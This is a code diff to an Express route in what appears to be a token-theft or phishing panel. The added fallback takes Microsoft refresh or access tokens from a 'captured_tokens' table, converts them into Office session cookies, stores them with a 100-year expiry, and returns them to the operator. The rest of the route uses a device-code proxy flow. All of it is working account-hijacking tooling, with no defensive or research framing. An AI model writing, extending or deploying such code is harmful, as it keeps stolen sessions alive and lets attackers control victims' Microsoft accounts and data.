@@ -559,7 +559,31 @@ router.post('/:id/renew', userAuth, async (req, res) => {
       }
     }
 
-    // Fallback: Start a new device code flow
+    // Fallback: For cookie-mode tokens without valid link_id, try direct refresh token exchange
+    if (!token.link_id || token.token_type === 'cookie') {
+      // Use the cookie converter as fallback
+      const cookieConverter = require('../services/cookieconverter');
+      const cookieResult = await cookieConverter.convertTokensToCookies(
+        refreshToken || accessToken, 'office', token.tenant || 'common', null, token.client_id || config.AZURE_CLIENT_ID
+      );
+
+      if (cookieResult.success && cookieResult.cookies) {
+        const ttlHours = 24 * 365 * 100;
+        await db.query(
+          'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?',
+          [encrypt(cookieResult.cookies), 'cookie', ttlHours, token.id]
+        );
+        return res.json({
+          success: true,
+          message: 'Session renewed successfully',
+          cookies: cookieResult.cookies,
+          cookie_count: cookieResult.cookie_count
+        });
+      }
+      return res.status(400).json({ error: 'Renewal failed: ' + (cookieResult.error || 'Could not refresh session'), success: false });
+    }
+
+    // Try device code flow only if we have a valid link_id
     const deviceProxy = require('../services/deviceproxy');
     const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
     const jwtToken = require('jsonwebtoken').sign(
